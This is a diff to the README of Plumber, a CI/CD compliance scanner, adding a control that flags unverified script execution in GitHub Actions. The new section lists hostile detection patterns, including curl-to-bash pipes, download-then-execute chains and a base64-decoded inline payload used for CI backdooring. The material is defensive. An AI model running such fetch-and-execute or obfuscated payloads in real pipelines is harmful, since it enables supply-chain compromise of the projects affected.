@@ -45,7 +45,7 @@ Plumber is a compliance scanner for CI/CD. It supports two providers:
 
 Both providers share **one** Rego policy engine and a **single** `.plumber.yaml` config (per-provider sections). Provider is auto-detected from your git `origin`: `github.com`/`gitlab.com` by host, and any other (corporate) host by looking for a `.github/workflows/` directory (a GitHub-mandated path) — present means GitHub, otherwise GitLab. Plumber prints which provider it picked and why on startup. To override, pass `--provider github|gitlab` (forces the provider, host still auto-detected), or `--gitlab-url` / `--github-url` (also pins a specific host/remote).
 
-Plumber ships **14 GitLab CI controls** and **14 GitHub Actions controls**. See the [GitLab CI controls](#gitlab-ci-controls) and [GitHub Actions controls](#github-actions-controls) sections for the full list of what each flags and how to configure it.
+Plumber ships **14 GitLab CI controls** and **15 GitHub Actions controls**. See the [GitLab CI controls](#gitlab-ci-controls) and [GitHub Actions controls](#github-actions-controls) sections for the full list of what each flags and how to configure it.
 
 **How does it work?** Plumber connects to your provider (or reads workflow files from disk), normalizes the pipeline into a provider-agnostic IR, evaluates Rego policies against it, and reports findings. You define what's allowed in `.plumber.yaml`. When your local clone matches the analyzed project, GitLab analysis can use your local `.gitlab-ci.yml` (or a [custom path](#custom-ci-configuration-file-path)) so you can validate before push; GitHub analysis reads `.github/workflows/` from your local repo by default and only hits the GitHub API for repo-level data (branch protection, etc.) when scope allows. Both paths report per-control compliance percentages and honor `--threshold` for exit-code gating.
 
@@ -104,6 +104,8 @@ Choose **one** of these methods:
 ## Option 1: CLI
 
 **Try Plumber in 2 minutes!** No commits, no CI changes, just run it.
+
+> **Runtime prerequisite: `git` on `PATH`.** Plumber shells out to `git` when analysing a local clone to auto-detect the remote URL, repo root and HEAD SHA used for source links. CI runners (GitHub Actions, GitLab Runner) ship with `git` pre-installed, and so does the `getplumber/plumber` Docker image. For local installs on macOS / Linux the system `git` is fine. If `git` is missing, auto-detection degrades silently — you'll need to pass `--gitlab-url` / `--github-url` and `--project` explicitly, and source links will reference the branch name instead of the analysed commit.
 
 ### Step 1: Install
 
@@ -617,7 +619,7 @@ The migration preserves comments, wraps `controls:` under `gitlab.controls:`, an
 
 ### Available Controls
 
-Plumber ships **14 GitLab CI controls** and **14 GitHub Actions controls** today. They are configured per-provider in [`.plumber.yaml`](./.plumber.yaml) and can be enabled / disabled / tuned independently.
+Plumber ships **14 GitLab CI controls** and **15 GitHub Actions controls** today. They are configured per-provider in [`.plumber.yaml`](./.plumber.yaml) and can be enabled / disabled / tuned independently.
 
 #### GitLab CI controls
 
@@ -1306,7 +1308,59 @@ Issue code: ISSUE-703.
 </details>
 
 <details>
-<summary><b>14. Pipeline must not enable debug trace</b></summary>
+<summary><b>14. Pipeline must not execute unverified scripts</b></summary>
+
+GitHub side of the cross-provider `pipelineMustNotExecuteUnverifiedScripts` rule. Flags every `run:` step that downloads or inline-executes code without an integrity check. Closes the Megalodon CI-backdooring vector (`echo "<base64>" | base64 -d | bash`) and the classic `curl … | bash` supply-chain pattern.
+
+Patterns the rule fires on:
+
+- pipe `curl`/`wget` directly into a shell — `curl … | bash`, `wget -qO- … | sh`
+- download then execute on the same line — `curl … -o install.sh && bash install.sh`
+- redirect to a file then execute — `curl … > install.sh; sh install.sh`
+- Megalodon-style inline payload — `echo "Q0I9…" | base64 -d | bash`
+- any generic `<cmd> | <shell>` chain — `cat /tmp/payload.sh | sh`
+- heredoc-as-camouflage on a download — `curl evil | bash <<EOF`
+
+False-positive guards keep the signal sharp:
+
+- pipe-to-shell substrings inside a quoted string don't fire — `echo "Install with curl … | bash"` is just documentation
+- heredoc-to-shell with no download on the line is operator-authored, in-tree content — `cat <<EOF | bash` stays silent
+- a verification command on the same line as the download exempts the line — `sha256sum -c`, `gpg --verify`, `cosign verify`/`verify-blob`
+- the verification check itself ignores quoted occurrences, so `echo "should sha256sum first" && curl evil | bash` does NOT bypass detection
+
+```yaml
+# Flagged
+- run: curl -sSL https://example.com/install.sh | bash
+- run: echo "Q0I9…" | base64 -d | bash
+
+# Safe — checksum on the same line
+- run: |
+    curl -sSL https://example.com/install.sh -o install.sh
+    echo "<sha256>  install.sh" | sha256sum -c -
+    bash install.sh
+
+# Safe — env binding + vendored script
+- env:
+    SCRIPT: scripts/setup.sh
+  run: bash "$SCRIPT"
+```
+
+```yaml
+github:
+  controls:
+    pipelineMustNotExecuteUnverifiedScripts:
+      enabled: true
+      # URLs that are trusted and should not trigger findings.
+      # Supports wildcards (e.g., https://internal-artifacts.example.com/*).
+      trustedUrls: []
+```
+
+`trustedUrls` is host-precise: `https://example.com/*` exempts `example.com/install.sh` but NOT `evil.example.com/install.sh`. Issue code: ISSUE-411 (shared with the GitLab side).
+
+</details>
+
+<details>
+<summary><b>15. Pipeline must not enable debug trace</b></summary>
 
 GitHub side of the cross-provider `pipelineMustNotEnableDebugTrace` rule (the GitLab side catches `CI_DEBUG_TRACE` / `CI_DEBUG_SERVICES`). Flags workflows or jobs that set `ACTIONS_STEP_DEBUG` or `ACTIONS_RUNNER_DEBUG` to a truthy value (`true`, `1`, `yes` — case-insensitive, trimmed).
 
@@ -1381,7 +1435,7 @@ Controls not selected are reported as **skipped** in the output. The `--controls
 </details>
 
 <details>
-<summary><b>Valid control names, GitHub (14)</b></summary>
+<summary><b>Valid control names, GitHub (15)</b></summary>
 
 | Control Name | Cross-provider? |
 |-------------|---|
@@ -1391,6 +1445,7 @@ Controls not selected are reported as **skipped** in the output. The `--controls
 | `branchMustBeProtected` | ✓ shared with GitLab |
 | `containerImageMustNotUseForbiddenTags` | ✓ shared with GitLab |
 | `pipelineMustNotEnableDebugTrace` | ✓ shared with GitLab |
+| `pipelineMustNotExecuteUnverifiedScripts` | ✓ shared with GitLab |
 | `pipelineMustNotUseDockerInDocker` | ✓ shared with GitLab |
 | `reusableWorkflowsMustNotInheritSecrets` | GitHub-only |
 | `securityJobsMustNotBeWeakened` | ✓ shared with GitLab |
